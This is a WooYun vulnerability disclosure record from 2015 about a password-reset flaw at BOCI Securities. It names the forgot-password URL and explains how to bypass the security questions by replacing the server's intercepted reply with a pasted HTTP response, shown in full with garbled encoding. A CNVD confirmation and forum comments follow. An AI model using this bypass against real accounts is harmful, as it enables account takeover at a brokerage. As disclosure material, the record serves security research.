{"id": 9335, "wybug_id": "wooyun-2015-0121040", "wybug_title": "中银国际证券公司存在重置任意用户密码漏洞", "wybug_corp": "中银国际证券", "wybug_author": "wooyun.org", "wybug_date": "2015-06-17 16:51", "wybug_open_date": "2015-08-06 10:00", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-06：\t细节向公众公开  简要描述： 你懂得 详细说明：  \nhttp://www.bocichina.com/boci/login/forgetPassword.jsp\n\n\n就这个了\n\n回答问题随便填，抓包。讲返回的包拦截，将以下包发出去！\nHTTP/1.1 200 OKDate: Tue, 16 Jun 2015 21:04:08 GMTServer: ApacheX-Powered-By: Servlet/2.5 JSP/2.1Content-Type: text/html;charset=UTF-8Connection: Keep-aliveKeep-Alive: timeout=15, max=100Via: 1.1 ID-0000627501262144 uproxy-2Content-Length: 5035<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /><link href=\"/boci/css/css.css\" type=\"text/css\" rel=\"stylesheet\" /><script type=\"text/javascript\" src=\"/boci/share/js/jsUtils.js\"></script><title>ä¸­é¶å½éè¯å¸</title><link rel=\"shortcut icon\" href=\"/boci/pic/favicon.ico\"/><link rel=\"BookMark\" href=\"/boci/pic/favicon.ico\"/><style type=\"text/css\"><!--.STYLE1 {color: #920022}.STYLE2 {color: #348800}.STYLE5 {\tfont-family:\"å¾®è½¯éé»\", \"å®ä½\";\tfont-size: 18px;\tfont-weight: bold;\tpadding:10px;}--></style></head><script></script><script>function check(){var password=document.getElementById(\"passWord\").value;if(/^([A-Z]|[a-z]|[\\d])*$/.test(password)==false||password.length<6||password.length>12){alert(\"å¯ç ä¸º 6-12 ä½å­æ¯ææ°å­\");document.getElementById(\"passWord\").value=\"\";document.getElementById(\"passWord\").focus();return false;}//æ°å¯ç åæ§å¯ç æ¯å¦ç¸åvar password_1=document.getElementById(\"passWord_1\").value;if(password!=password_1){alert(\"ä¸¤æ¬¡è¾å¥å¯ç ä¸ç¸å\");document.getElementById(\"passWord_1\").value=\"\";document.getElementById(\"passWord_1\").focus();return false;}}</script><body><div id=\"layout\"><table width=\"500\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> <tr>    <td>  <table width=\"900\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" bgcolor=\"#ffffff\" height=\"60\">        <tr>          <td><a href=\"/boci/index/index.jsp?firstMenu=qtcd_index\"><img src=\"/boci/pic/logo.jpg\" width=\"315\" height=\"60\" border=\"0\" /></a></td>          <td width=\"427\"></td>        </tr>      </table>      <table width=\"900\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" bgcolor=\"#ffffff\">       <tr>         <td width=\"900\" background=\"/boci/pic/menu_07.jpg\"><img src=\"/boci/pic/menu_07.jpg\" width=\"6\" height=\"13\" /></td>       </tr>       </table></td>  </tr></table><table width=\"900\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\"><form action=\"/boci/user.do?method=updatePassword\" method=\"post\" name=\"thisForm\" id=\"thisForm\" onsubmit=\"return check()\">\t<tr>\t     <td width=\"20\"></td>\t     <td height=\"35\" background=\"/boci/pic/zcgl_30.jpg\" class=\"text14\" style=\"padding-left:60px;\">å¿è®°å¯ç </td>\t     <td width=\"20\"></td>\t</tr>\t<tr>\t  <td></td>\t  <td height=\"35\" style=\"padding:10px; line-height:25px;\"><p><table width=\"750\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\">        <tr>          <td><img src=\"/boci/pic/login/tab_top.gif\" height=\"11\" /></td>        </tr>        <tr>          <td valign=\"top\" background=\"/boci/pic/login/tab_mid.gif\" style=\"padding:10px 20px;\"><table width=\"33%\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\">              <tr>                <td height=\"10\"></td>              </tr>            </table> \t\t    <table width=\"35%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" align=\"center\">                                        <tr align=\"left\" bgcolor=\"#F2F2F2\">                      <td colspan=\"3\" style=\"padding: 2px 15px;\">è¯·è¾å¥æ°å¯ç  ï¼                        <input name=\"passWord\" id=\"passWord\" type=\"password\" class=\"sousuotiao\" size=\"18\" style=\"border:1px solid #cccccc;\" />                      </td>                    </tr>                                          <tr align=\"left\" bgcolor=\"#F2F2F2\">                      <td colspan=\"3\" style=\"padding: 2px 15px;\">æ° å¯ç  ç¡®è®¤  ï¼                        <input name=\"passWord_1\" id=\"passWord_1\" type=\"password\" class=\"sousuotiao\" size=\"18\" style=\"border:1px solid #cccccc;\" />                      </td>                    </tr>              </table>\t\t\t  <table width=\"97\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\">\t\t\t              <tr>                <td height=\"20\"></td>              </tr>            </table>                         <table width=\"33%\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\">                <tr align=\"center\">                  <td height=\"15\"><input type=\"submit\" name=\"Submit2\" value=\"ç¡®å®\" class=\"button4\"  /></td>                </tr>              </table>                                           </td>        </tr>        <tr>          <td align=\"center\"><img src=\"/boci/pic/login/tab_bot.gif\" height=\"11\" /></td>        </tr>      </table></td>\t  <td></td>    </tr>\t<tr>\t  <td></td>\t  <td height=\"35\" class=\"text14\" style=\"padding-left:10px;\">&nbsp;</td>\t  <td></td>    </tr></form></table><table width=\"900\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">  <tr>    <td><iframe src=\"/boci/share/foot.jsp\" frameborder=\"0\" width=\"900\" height=\"64\" scrolling=\"no\"></iframe></td>  </tr></table></div></body></html>\n成功跳刀更改密码处\n\n\n\n\n\n   漏洞证明：  \n\n   修复方案：     版权声明：转载请注明来源 wooyun.org@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-06-22 09:59 厂商回复： cnvd确认并复现所述情况，转由cncert向证券行业信息化主管部门通报，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-17 17:20 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  大哥 不怕封杀还是换个名字吧    \n     2015-06-17 17:55 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  wooyun.gov.cn    \n     2015-06-17 18:51 |    \t\twooyun.org \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        | WooYun是一个位于厂商和安全研究者之间的安...)\t\t \n  @xsser 我好怕，快给我随便想一个，我改改！！    \n     2015-06-17 19:00 |    \t\twooyun.org \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        | WooYun是一个位于厂商和安全研究者之间的安...)\t\t \n  @xsser 帮我换成WooYunTest吧    \n     2015-06-17 19:41 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @wooyun.org 你想死吗.... 黑我大众测..    \n     2015-06-17 20:29 |    \t\twooyun.org \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        | WooYun是一个位于厂商和安全研究者之间的安...)\t\t \n  @zeracker 怎么黑了，屌丝！！    \n     2015-06-17 21:09 |    \t\twooyun.org \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        | WooYun是一个位于厂商和安全研究者之间的安...)\t\t \n  @xsser @zeracker 我懂了。那就帮我改成\"摩擦一磨擦\"吧，拜托了    \n     2015-06-17 21:12 |    \t\twooyun.org \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        | WooYun是一个位于厂商和安全研究者之间的安...)\t\t \n  以后所有的洞都匿名。一个名字这么多事，哎。。。    \n     2015-08-06 10:07 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  答案见json    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}